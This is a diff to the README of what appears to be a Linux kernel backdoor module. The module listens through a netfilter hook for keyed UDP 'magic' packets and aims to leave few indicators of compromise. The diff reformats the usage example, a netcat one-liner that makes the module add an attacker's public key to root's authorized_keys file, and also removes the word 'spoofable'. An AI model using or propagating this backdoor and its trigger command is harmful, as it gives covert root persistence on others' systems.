@@ -7,7 +7,7 @@ It exposes a simple interface to the network via a netfilter hook. The idea is t
 There's no userspace component, no hiding of processes or files. Yield as few indicators of compromise as possible;
 so touch userspace as little as possible.
 
-The current implementation expects a (spoofable) UDP packet that follows a simple protocol: ```magic_value:current_key:new_key:command```
+The current implementation expects a UDP packet that follows a simple protocol: ```magic_value:current_key:new_key:command```
 
 ##features
 * add user to the system
@@ -35,9 +35,11 @@ The current implementation expects a (spoofable) UDP packet that follows a simpl
 * unless something like diffie-hellmann is used for key exchange, you can capture the key over the network to decrypt payload
     * so it still means you need memory dump & pcap to analyze the payload
     
-##example
-Add a public key to the root user's ```/root/.ssh/authorized_keys``` file.
+##examples
+1. Add a public key to the root user's ```/root/.ssh/authorized_keys``` file.
 
-```$ echo 'key:0124812401:1111111111:2' | nc -u $host 8001```
-
-Current key is ```0124812401```. New key becomes ```1111111111```. Get the key wrong, and your kernel oops :)
+    ```bash
+    # Current (decryption) key is ```0124812401```. New (re-encryption) key becomes ```1111111111```.
+    # Get the decryption key wrong, and 95% chance the kernel will oops.
+    $ echo 'key:0124812401:1111111111:2' | nc -u $host 8001
+    ```
